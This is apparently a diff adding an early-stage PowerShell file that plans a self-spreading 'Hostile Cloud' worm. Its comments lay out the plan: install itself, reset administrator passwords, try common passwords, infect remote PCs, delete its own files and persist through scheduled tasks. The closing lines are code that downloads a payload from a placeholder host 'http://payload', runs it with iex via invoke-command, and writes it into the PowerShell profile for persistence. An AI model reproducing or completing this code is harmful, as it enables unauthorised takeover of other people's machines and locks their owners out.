@@ -1,0 +1,66 @@
+<#
+Cloud Initiative ()
+
+Services to provide:
+1. Web hosting.
+- Site.
+- Modules.
+- Keys.
+- API.
+2. Dropbox / payload storage.
+- Selective Dropbox sync.
+3. Remote execution environment.
+- Messaging relay.
+5. Algorithmic growth - have a node store more of the payload over time.
+- Torrent for data transfer, under heavy throttle.
+-Dropbox sync.
+6. Thing that syncs your PS1.TXT with your PS1 - for better mobile integration.
+7. 
+
+
+#>
+
+<#
+Hostile Cloud Initiative (ineXORable)
+- What is a Hostile Cloud? 
+A Hostile Cloud is a Cloud, or network of PCs and devices, hosted on hostile servers and networks through intrusive and undocumented features.
+
+Plans:
+1. Install itself, change admin pw, listen for more directions.
+- Use common passwords.
+2. Reset password, store that somewhere.
+- Resiliency to reboots?
+3. If IIS/Apache/etc installed, adds random page to website.
+
+Need to fix New-Module up with the new module stuff. (FLAG)
+Thing that syncs your PS1.TXT with your PS1 - for better mobile integration. (FLAG)
+
+#>
+
+<#
+- Modules that delete their file. 
+- Choose random unused 5-digit UDP ports as message bus.
+
+1. Install itself, change admin pw, listen for more directions.  
+Begin - bootstrap - import HCI.
+- Gathers module locations, downloads and saves module payload. 
+- Sets up self-deleting scheduled task to run files.
+- Resets admin password.
+- Deletes any install files.
+
+Process - infecter - Runs "import bootstrap" against remote PCs.
+- Gathers server list and password list from somewhere.
+- Runs remote command "invoke-command iex ((new-object net.webclient).DownloadString("http://payload"))"
+- #"((iwr http://payload).content >> $env:psmodulepath\file.ps1; 'ipmo $env:psmodulepath\file.ps1' > $profile) -"
+
+End - cleanup
+- Set "reinfector" in an on-login scheduled task. 
+
+#>
+
+#Bootstrap
+# Gathers module locations, downloads and saves module payload. 
+((iwr http://payload).content >> $env:psmodulepath\file.ps1; 'ipmo $env:psmodulepath\file.ps1' > $profile)
+#Infecter:
+invoke-command iex ((new-object net.webclient).DownloadString("http://payload"))
+
